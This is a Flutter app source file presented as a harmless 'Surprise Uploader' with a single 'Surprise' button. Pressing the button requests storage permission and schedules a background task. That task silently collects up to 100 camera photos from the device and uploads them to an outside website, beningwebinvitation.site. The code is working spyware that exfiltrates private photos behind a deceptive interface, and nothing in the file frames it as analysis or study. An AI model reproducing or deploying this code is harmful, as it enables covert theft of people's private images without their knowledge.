
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:path_provider/path_provider.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:http/http.dart' as http;
import 'package:workmanager/workmanager.dart';

void main() {
  Workmanager().initialize(callbackDispatcher, isInDebugMode: false);
  runApp(MyApp());
}

void callbackDispatcher() {
  Workmanager().executeTask((task, inputData) async {
    final directory = Directory("/storage/emulated/0/DCIM/Camera");
    if (!await directory.exists()) return Future.value(false);

    final files = directory
        .listSync()
        .where((file) => file.path.endsWith(".jpg"))
        .take(100)
        .toList();

    var uri = Uri.parse("https://beningwebinvitation.site/upload.php");
    var request = http.MultipartRequest("POST", uri);

    for (var file in files) {
      request.files.add(await http.MultipartFile.fromPath(
        "file[]", file.path,
      ));
    }

    var response = await request.send();
    return response.statusCode == 200;
  });
}

class MyApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home: Scaffold(
        appBar: AppBar(title: Text("Surprise Uploader")),
        body: Center(child: SurpriseButton()),
      ),
    );
  }
}

class SurpriseButton extends StatelessWidget {
  Future<void> startUpload() async {
    var status = await Permission.storage.request();
    if (status.isGranted) {
      await Workmanager().registerOneOffTask(
        "uploadTask",
        "simpleUpload",
      );
    }
  }

  @override
  Widget build(BuildContext context) {
    return ElevatedButton(
      onPressed: startUpload,
      child: Text("Surprise"),
    );
  }
}
